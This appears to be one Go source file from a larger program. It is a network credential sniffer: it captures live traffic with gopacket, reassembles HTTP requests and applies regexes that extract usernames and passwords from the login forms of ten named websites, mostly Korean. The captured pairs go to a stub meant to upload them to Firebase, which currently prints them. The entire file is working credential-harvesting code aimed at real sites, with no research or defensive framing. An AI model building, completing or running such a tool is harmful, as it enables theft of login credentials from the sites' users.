package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"regexp"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket/tcpassembly"
	"github.com/google/gopacket/tcpassembly/tcpreader"
)

var (
	reMap = map[string]*regexp.Regexp{
		"http://www.dailysecu.com/":   regexp.MustCompile(`&login_userid=(.+)&login_userpw=(.+)`),
		"http://www.hanbit.co.kr/":    regexp.MustCompile(`&m_id=(.+)&m_passwd=(.+)`),
		"http://www.icqa.or.kr/":      regexp.MustCompile(`&txtID=(.+)&txtPass=(.+)`),
		"http://www.giordano.co.kr/":  regexp.MustCompile(`Data%5Bid%5D=(.+)&Data%5Bpw%5D=(.+)`),
		"http://www.nike.co.kr/":      regexp.MustCompile(`&loginId=(.+)&password=(.+)`),
		"http://www.junggo.com/":      regexp.MustCompile(`&mb_id=(.+)&mb_password=(.+)`),
		"http://m.bunjang.co.kr/":     regexp.MustCompile(`userid=(.+)&userpw=(.+)&`),
		"http://www.coocha.co.kr/":    regexp.MustCompile(`mid=(.+)&mpwd=(.+)`),
		"http://www.daisomall.co.kr/": regexp.MustCompile(`&id=(.+)&pw=(.+)`),
		"http://www.ebsi.co.kr/":      regexp.MustCompile(`username=(.+)&j_password=(.+)`),
	}
)

// httpStreamFactory implements tcpassembly.StreamFactory
type httpStreamFactory struct{}

func (h *httpStreamFactory) New(_, _ gopacket.Flow) tcpassembly.Stream {
	r := tcpreader.NewReaderStream()
	go func() {
		buf := bufio.NewReader(&r)
		for {
			if req, err := http.ReadRequest(buf); err == io.EOF {
				return
			} else if err != nil {
				// log.Println("Error parsing HTTP requests:", err)
			} else {
				body, err := ioutil.ReadAll(req.Body)
				defer req.Body.Close()
				if err != nil {
					continue
				}
				if !isGETorPOST(body) {
					continue
				}
				if parsed := find(body); len(parsed) > 0 {
					writeToFirebase(parsed)
				}
			}
		}
	}()
	return &r
}

func isGETorPOST(http []byte) bool {
	if len(http) > 5 && (bytes.Equal(http[:4], []byte("GET ")) || bytes.Equal(http[:5], []byte("POST "))) {
		return true
	}
	return false
}

func find(http []byte) []string {
	for url, re := range reMap {
		parsed := re.FindSubmatch(http)
		if len(parsed) != 3 {
			continue
		}
		return []string{url, string(parsed[1]), string(parsed[2])}
	}
	return nil
}

func writeToFirebase(row []string) {
	// working...
	fmt.Println(row)
}

func parse(device pcap.Interface) {
	handle, err := pcap.OpenLive(device.Name, snapshotLen, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	streamFactory := &httpStreamFactory{}
	streamPool := tcpassembly.NewStreamPool(streamFactory)
	assembler := tcpassembly.NewAssembler(streamPool)

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	packets := packetSource.Packets()
	ticker := time.Tick(time.Minute)
	for {
		select {
		case packet := <-packets:
			if packet.NetworkLayer() == nil || packet.TransportLayer() == nil || packet.TransportLayer().LayerType() != layers.LayerTypeTCP {
				continue
			}
			tcp := packet.TransportLayer().(*layers.TCP)
			assembler.AssembleWithTimestamp(packet.NetworkLayer().NetworkFlow(), tcp, packet.Metadata().Timestamp)
		case <-ticker:
			// Every minute, flush connections that haven't seen activity in the past 2 minutes.
			assembler.FlushOlderThan(time.Now().Add(time.Minute * -2))
		}
	}
}
